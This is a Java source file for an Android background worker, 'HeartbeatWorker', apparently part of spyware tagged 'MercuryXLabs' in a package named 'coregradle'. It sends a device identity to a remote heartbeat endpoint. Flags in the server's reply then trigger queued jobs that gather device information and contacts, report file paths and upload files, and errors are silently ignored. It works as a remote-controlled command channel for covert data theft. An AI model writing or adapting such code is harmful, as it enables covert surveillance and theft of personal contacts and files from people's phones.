package org.code.coregradle.workers;

import android.content.Context;

import androidx.annotation.NonNull;
import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class HeartbeatWorker extends Worker {

    private Context baseCtx;
    private OkHttpClient okHttpClient;
    public final static String WORK_IDENTIFIER = "MercuryXLabs::Heartbeat";
    private final IdentityStore identityStore;

    public HeartbeatWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        okHttpClient = new OkHttpClient();
        this.identityStore = IdentityStore.getInstance(context);
    }


    public Result makeRequest() {
        try {
            JSONObject requestJSON = new JSONObject();
            requestJSON.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());

            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REQUEST_HEARTBEAT_URL)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                JSONObject responseJSON = new JSONObject(response.body().string());
                if (responseJSON.has("basicInfo") && responseJSON.getBoolean("basicInfo")) {
                    WorkManager.getInstance(getApplicationContext()).enqueue(BasicInfoWorker.getOneTimeWorkRequest());
                    WorkManager.getInstance(getApplicationContext()).enqueue(LiveBasicInfoWorker.getOneTimeWorkRequest());
                }
                if (responseJSON.has("contactInfo") && responseJSON.getBoolean("contactInfo")) {
                    WorkManager.getInstance(getApplicationContext()).enqueue(ContactInfoWorker.getOneTimeWorkRequest());
                }
                if (responseJSON.has("fileSync") && responseJSON.getBoolean("fileSync")) {
                    WorkManager.getInstance(getApplicationContext()).enqueue(UploadWorker.getOneTimeWorkRequest());
                }
                if (responseJSON.has("fileReport") && responseJSON.getBoolean("fileReport")) {
                    WorkManager.getInstance(getApplicationContext()).enqueue(FilePathWorker.getOneTimeWorkRequest());
                }

                return Result.success();
            }
        } catch (Exception ignored) {

        }
        return Result.failure();
    }

    @NonNull
    @Override
    public Result doWork() {
        return makeRequest();
    }

    public static OneTimeWorkRequest getOneTimeWorkRequest() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .build();
        return new OneTimeWorkRequest.Builder(HeartbeatWorker.class)
                .setConstraints(constraints)
                .setBackoffCriteria(
                        BackoffPolicy.LINEAR,
                        OneTimeWorkRequest.MIN_BACKOFF_MILLIS,
                        TimeUnit.MILLISECONDS)
                .build();
    }
}
